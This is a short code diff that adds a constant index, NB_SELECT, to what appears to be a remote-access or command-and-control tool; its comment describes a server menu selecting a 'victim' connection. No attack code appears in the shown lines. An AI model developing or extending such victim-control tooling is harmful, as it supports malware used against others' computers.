@@ -13,6 +13,7 @@ NB_ADMIN = 5
 NB_PATH = 6
 NB_USERNAME = 7
 NB_TOKEN = 8
+NB_SELECT = 9  #When the server(menu) selects the victim, the victim is considered dead in Handler.dict_conn (False). This serves to avoid confusion when sending data. 
 
 SOCK_TIMEOUT = 4
 
